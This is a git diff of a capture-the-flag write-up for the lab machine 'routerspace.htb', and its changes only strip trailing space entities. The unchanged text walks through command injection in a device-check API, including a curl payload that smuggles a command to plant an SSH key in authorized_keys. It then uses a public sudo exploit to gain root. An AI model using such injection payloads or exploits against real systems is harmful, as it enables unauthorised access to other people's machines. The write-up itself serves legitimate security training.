@@ -54,7 +54,7 @@ function _0x31d2() {
 ```
 {% endcode %}
 
-This looks like a request, and it is to `http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess`. This means that we can probably access the application from the website. We can see `n/json`, which means they are probably sending JSON POST requests. We also see `0.0.0.0`, which is looks like an IP address.&#x20;
+This looks like a request, and it is to `http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess`. This means that we can probably access the application from the website. We can see `n/json`, which means they are probably sending JSON POST requests. We also see `0.0.0.0`, which is looks like an IP address.
 
 {% code overflow="wrap" %}
 ```bash
@@ -63,7 +63,7 @@ $ curl -X POST http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceA
 ```
 {% endcode %}
 
-We can test for RCE or injection, and find that RCE works.&#x20;
+We can test for RCE or injection, and find that RCE works.
 
 {% code overflow="wrap" %}
 ```bash
@@ -72,19 +72,19 @@ $ curl -X POST http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceA
 ```
 {% endcode %}
 
-We can get a reverse shell from or we can put our public key into the `authorized_keys` file.&#x20;
+We can get a reverse shell from or we can put our public key into the `authorized_keys` file.
 
 <pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>$ curl -X POST http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H 'Content-Type: application/json' -H "User-Agent: RouterSpaceAgent" -d '{"ip":"127.0.0.1; echo ssh-rsa KEY kali@kali > /home/paul/.ssh/authorized_keys"}'
 </strong>"127.0.0.1\n"
 </code></pre>
 
-Then, we can `ssh` in as `paul`.&#x20;
+Then, we can `ssh` in as `paul`.
 
 ## Privilege Escalation
 
 ### Sudo Exploit
 
-This machine is running an outdated version of `sudo`.&#x20;
+This machine is running an outdated version of `sudo`.
 
 ```
 paul@routerspace:~$ sudo --version
@@ -98,7 +98,7 @@ We can use this repository to exploit it:
 
 {% embed url="https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit" %}
 
-Transfer the files over `scp`.&#x20;
+Transfer the files over `scp`.
 
 ```
 $ scp * paul@routerspace.htb:~
